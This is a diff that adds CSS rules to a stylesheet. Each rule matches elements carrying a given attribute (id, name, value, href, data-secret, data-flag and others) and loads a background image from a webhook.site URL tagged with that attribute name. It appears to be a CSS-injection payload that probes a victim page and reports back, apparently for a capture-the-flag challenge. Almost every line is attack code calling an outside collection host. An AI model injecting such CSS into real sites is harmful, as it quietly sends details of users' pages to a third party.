@@ -1,3 +1,43 @@
+/* Detect common attributes presence and ping webhook */
+*[id] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=id');
+}
+*[class] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=class');
+}
+*[name] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=name');
+}
+*[value] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=value');
+}
+*[href] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=href');
+}
+*[title] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=title');
+}
+*[placeholder] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=placeholder');
+}
+*[alt] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=alt');
+}
+*[type] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=type');
+}
+
+/* Common data-* attributes */
+*[data-secret] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=data-secret');
+}
+*[data-flag] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=data-flag');
+}
+*[data-value] {
+  background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=data-value');
+}
+
 /* Test common HTML attributes */
 *[id] {
   background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?attr=id');
